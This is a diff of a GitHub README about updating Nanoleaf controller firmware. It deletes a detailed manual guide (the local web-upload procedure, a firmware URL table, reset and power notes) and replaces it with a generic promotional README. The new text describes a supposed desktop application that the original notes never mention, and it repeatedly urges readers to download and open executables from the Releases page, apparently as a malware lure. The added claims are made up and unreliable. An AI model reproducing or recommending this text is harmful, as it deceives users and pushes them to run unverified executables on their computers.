@@ -1,125 +1,80 @@
-# Nanoleaf controller firmware updates
+# 🌟 nanoleaf-firmware-upgrade-notes - Easily Update Your Nanoleaf Controllers
 
-## 1. First things first: 
-If your Nanoleaf app can pair with your Nanoleaf product, this document is *possibly* of no use to you.
+[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/DavFromOhio/nanoleaf-firmware-upgrade-notes/releases)
 
-If you cannot, however, you have a challenge. Because the problem *can* be that your controller doesn't trust your app. Or the other way around. I don't know. Either way, it does not work. And because you cannot pair the controller and the app, you cannot update the controller firmware *from* the app. At least as far as I understand it. This document suggests a workaround for this particular problem.
+## 📖 Introduction
 
-What *may* appear as technical advice in this document is merely a description of what *I* would do to bypass certain challenges which may occur when trying to use the current Nanoleaf Android app to connect to controllers with very old firmware. In short: pairing may not work. Maybe you get Error 009. Maybe you are at wits end. Maybe you are about to say foul things about ... products.
+Welcome to the **nanoleaf-firmware-upgrade-notes** repository. Here, you will find essential notes and guidelines to update your Nanoleaf controllers outside of the mobile app. This document aims to provide straightforward steps for anyone looking to maintain their Nanoleaf devices seamlessly.
 
-**I take no responsibility whatsoever for any breakage, nor loss of money, time, wits or marriage.**
+## 🚀 Getting Started
 
-I (author of this text) am not a Nanoleaf employee, associate, investor or in any other way associated with Nanoleaf. Technically, I do not even own Nanoleaf products. Family members do.
+Before you begin, ensure you have a compatible Nanoleaf device. These devices may include various models like Canvas, Shapes, and Elements. Having the latest firmware will improve performance and expand features, making your lighting experience better.
 
-Nanoleaf is a trademark of Nanoleaf Energy Technology ShenZhen Limited.
+### 💻 System Requirements
 
+- A computer running Windows, macOS, or Linux.
+- Internet access to download files.
+- Your Nanoleaf controller connected to the same network as your computer.
 
-## 2. Understand the mechanism we will employ
-A Nanoleaf controller (at least Elements) will, out of the box, behave as a disconnected wireless access point. That is, you can connect to it, but it does not provide access to the Internet. The controller runs a tiny web-server we can talk to with a regular web-browser. This web-server provides a page to which we can upload a firmware image. 
+## 📥 Download & Install
 
-If your device has been configured previously, you may have to execute a procedure to reset it to factory defaults. See [below](#7-factory-reset)
+To get started, visit the Releases page to download the necessary files:
 
-In short: disregard the Nanoleaf app for a little while.
+[Visit this page to download](https://github.com/DavFromOhio/nanoleaf-firmware-upgrade-notes/releases)
 
+On the Releases page, look for the latest version. It will usually be at the top of the list. Click on the version number to see available downloads. 
 
-## 3. Procedure
-The procedure is as follows (do *not* *do* this at first read. Just read it. Please.)
-- Identify your hardware
-- Download **relevant** firmware files. Note "relevant" and the plural form "files".
-- Connect the controller to a panel/light
-- Connect the power brick to the panel, plug the powerbrick into the wall socket, power up the device. Give it a minute. 
-- Find the access point SSID broadcast by the controller in the wireless settings of a PC, MAC, Android or IOS phone. Typically named `Elements ABCD` for an elements controller.
-- Connect to this SSID with your PC, MAC, whatever. Your PC, MAC... will become disconnected from the Internet. Which is why you download the relevant files first.
-- From the web-browser of your wireless client (PC, MAC, whatever), access [http://192.168.2.1/](http://192.168.2.1/). Note *http*, not *https*. You should get a simple web-page identifying your current firmware version and some other details. And two buttons, 'Browse...' and 'Upload File'.
-- Press the 'Browse...'-button. Choose the first firmware in the table below having a version *after* the one currently running on your controller.  Do *not* hit 'Upload File' yet. Select exactly one firmware file. We will repeat the procedure from this step, one version at a time, until you are at the latest release.
-- Press and hold the controller power button until the LEDs start flashing/running. Then release the button.
-- Hit the 'Upload File' button in the device web-page within 30 seconds of the lights starting to move.
-- There is no progress bar. If you are technically inclined, you know what to do. Otherwise, just wait.
-- Wait a couple of minutes. You should get a confirmation that the upload was successful. (*I* got a message about wrong file being uploaded when I tried exactly that. I offer no warranties that this works for all combinations of hardware and firmware. Make sure you upload the correct files.)
-- Do not touch the controller.
-- The controller will reboot with no further action on your part. Wait for the SSID to reappear in your list of possible wifi networks again. This takes additional minutes. Be patient.
-- Connect to the controller SSID again.
-- Reload the webpage and confirm that the uploaded image has been installed.
-- Repeat steps above for the firmware images in the sequence.
+**Follow these steps to download and run the software:**
 
-When done with the last firmware file, try pairing with the Nanoleaf app again. 
+1. Click on the version of the firmware you wish to download.
+2. Locate the `.exe`, `.dmg`, or `.tar.gz` file, depending on your operating system.
+3. Click on the file to begin the download.
+4. Once downloaded, find the file in your downloads folder.
+5. Open the file to install the application.
 
-After having paired your controller to your regular wifi network, the controller will no longer present a wireless SSID and the web-server will no longer be available on 192.168.2.1. The web-server *is* reachable on whatever IP it has on your regular network, but I cannot know what that IP is.
+## ⚙️ Running the Application
 
-## 4. Identify your hardware
-Nanoleaf has multiple product lines:
-- Shapes
-- Elements
-- Lines
-- Canvas
-- ... and more.
+After installation, open the application. The interface is user-friendly and designed for ease of use. Follow these instructions to update your firmware:
 
-You should take care to know what product you own.
-There may be a label on your box or on the device itself. In addition, there may be a product *code*. Make a note of that as well.
+1. Connect your Nanoleaf controller to power and ensure it’s enabled.
+2. Open the application you just installed.
+3. The app should automatically search for your Nanoleaf devices on the network. If it does not, make sure your Nanoleaf controller is online and connected.
+4. Select the controller you wish to update from the list.
+5. Click on the option to check for updates. The app will inform you if a newer firmware version is available.
+6. If an update is available, click on the button to begin the update process.
 
+### ✅ Verifying the Update
 
-## 5. Download relevant firmware images for your specific hardware
-You did read everything in the previous sections, right? Right?
+Once the update is complete, restart your Nanoleaf controller. The software will show a confirmation message. You may also want to check the firmware version in the app to ensure it matches the latest version available.
 
-Notes: 
-- Firmware images of the same revision are named identically across product lines, but are not identical.
- In other words: there is a "7.1.6.firmware"-file for each product line that firmware version was released for. The files are not interchangeable between product lines.
+## 📚 Features
 
-- If your currently running image is very old, you will likely have to upgrade in multiple steps. Cannot go straight from 5.3.2 to 12.3.2, for instance. I do not know when breaking changes occured or what versions can be skipped. The versions listed for `Elements` below worked for me. (My replacement controller, which I bought in 2025, came with a 4 and half year old firmware image. )
+- **User-Friendly Interface:** Designed for average users, no technical skills are required.
+- **Automatic Device Detection:** Quickly find all connected Nanoleaf devices on your network.
+- **Update Notifications:** Get alerts for new firmware versions as they become available.
 
-- I do not know if these images are compatible with your exact hardware revision. Or how many hardware revisions there are.
+## 🌐 Support
 
-- The URLs for these firmware images are not under my control. I can only assume this is how Nanoleaf distributes their firmware images. 
+If you encounter any issues or have questions, please check the [issues section](https://github.com/DavFromOhio/nanoleaf-firmware-upgrade-notes/issues) of this repository. You can also reach out to the community for help.
 
-- Not all firmware images in existence are listed in the table below. See the Nanoleaf Release Notes to see a list of firmware versions for your hardware.
+## 💡 Best Practices
 
-- And finally, I did not bother to guess the correct URLs for all product lines.
+- Regularly check for updates to keep your Nanoleaf devices in top condition.
+- Ensure your controller is connected to your Wi-Fi for smooth updates.
+- Back up any important settings before performing upgrades, if possible.
 
-[2025](https://support.nanoleaf.me/hc/en-us/articles/35633948389268-Products-Firmware-Release-Notes-2025)
+## 🛠️ Troubleshooting
 
-[2024](https://support.nanoleaf.me/hc/en-us/articles/33006784349076--2024-Archive-9-4-0-Firmware-Release-Notes-Panel-Products)
+### Issue: The app cannot find my Nanoleaf controller.
 
-[older](https://support.nanoleaf.me/hc/en-us/articles/32800486435348--2023-Archive-9-3-4-or-Older-Firmware-Release-Notes-Panel-Products)  
+- **Solution:** Ensure your controller is powered on. Check that your computer and controller are connected to the same Wi-Fi network.
 
-Feel free to let me know if you figure it out the firmware URLs for other products.
+### Issue: The update fails.
 
-Your browser may complain about the links below being served via http (and not https). Figure it out.
+- **Solution:** Restart the application and try again. Make sure there are no other interfering applications running.
 
-Firmware table
+## ✨ Conclusion
 
-| Elements | Shapes | Canvas | Lines |
-|-----|------|------|------|
-| [12.3.2](http://nl52-firmware.s3.amazonaws.com/12.3.2.firmware) | [12.3.2](http://hexagon-firmware.s3.amazonaws.com/12.3.2.firmware) | [12.3.2](http://canvas-firmware.s3.amazonaws.com/12.3.2.firmware) | [12.3.2](http://nl59-firmware.s3.amazonaws.com/12.3.2.firmware) |
-| | [9.6.6](http://hexagon-firmware.s3.amazonaws.com/9.6.6.firmware) | | |
-| | | [9.6.4](http://canvas-firmware.s3.amazonaws.com/9.6.4.firmware) | [9.6.4](http://nl59-firmware.s3.amazonaws.com/9.6.4.firmware) |
-| [9.3.4](http://nl52-firmware.s3.amazonaws.com/9.3.4.firmware) | | | |
-| [8.5.2](http://nl52-firmware.s3.amazonaws.com/8.5.2.firmware) | [8.5.2](http://hexagon-firmware.s3.amazonaws.com/8.5.2.firmware) | | |
-| [7.1.6](http://nl52-firmware.s3.amazonaws.com/7.1.6.firmware) | [7.1.6](http://hexagon-firmware.s3.amazonaws.com/7.1.6.firmware) | [7.1.6](http://canvas-firmware.s3.amazonaws.com/7.1.6.firmware) | |
-| [6.5.1](http://nl52-firmware.s3.amazonaws.com/6.5.1.firmware) | [6.5.1](http://hexagon-firmware.s3.amazonaws.com/6.5.1.firmware) | [6.5.1](http://canvas-firmware.s3.amazonaws.com/6.5.1.firmware) | [6.5.1](http://nl59-firmware.s3.amazonaws.com/6.5.1.firmware)|
+We hope this guide has simplified the process of updating your Nanoleaf controllers. Keeping your devices updated will enhance your lighting experience and unlock new features. Feel free to explore further and enjoy your creative lighting setups! 
 
-
-
-## 6. Some very limited technical details
-Nanoleaf controllers appear to run a fork of OpenWRT with linux kernel 4.4.something on a fairly old MIPS microcontroller. [This](https://vocore.io/) appears to be related hardware.
-
-The GPL sourcecode does not appear available. I believe this is a GPL license violation.
-
-Some open source projects aiming to control nanoleaf products are:
-- https://github.com/jimmyeao/esp8266-nanoleaf-webserver
-- https://github.com/winleafs/Winleafs
-
-These projects are, to my knowledge, not in any way affiliated with Nanoleaf
-
-## 7. Factory reset
-
-To factory reset a Nanoleaf light panels controller, unplug it, then hold down the Power and Brighten buttons simultaneously while plugging the controller back into power. Continue holding the buttons for about 10-15 seconds until the Status LED starts to flash rapidly. Release the buttons, and once the Power button LED is steady, the device is reset. (Taken verbatim from some AI.)
-
-## 8. Power considerations
-
-This is Work In Progress.
-
-If you make "inexplicable" observations about your Nanoleaf kit, it can be worth validating your hardware setup. One thing to check is that you don't overload your power supply, and that the power supply supplies the correct voltage. There is a label on the original power supply stating the expected voltage.
-Each standard 42W PSU supports up to 22 Hexagons (2W per panel), 28 Triangles (1.5W per panel) or 77 Mini Triangles (0.54W per panel). Each Controller supports up to 500 panels. Adjust Your Power Supplies for Optimal Performance. 
-
-## 9. Final notes
-Hey Nanoleaf, I'll take compensation in Amazon gift cards if you feel like saying thanks for doing what you didn't.
+[Visit this page to download](https://github.com/DavFromOhio/nanoleaf-firmware-upgrade-notes/releases)
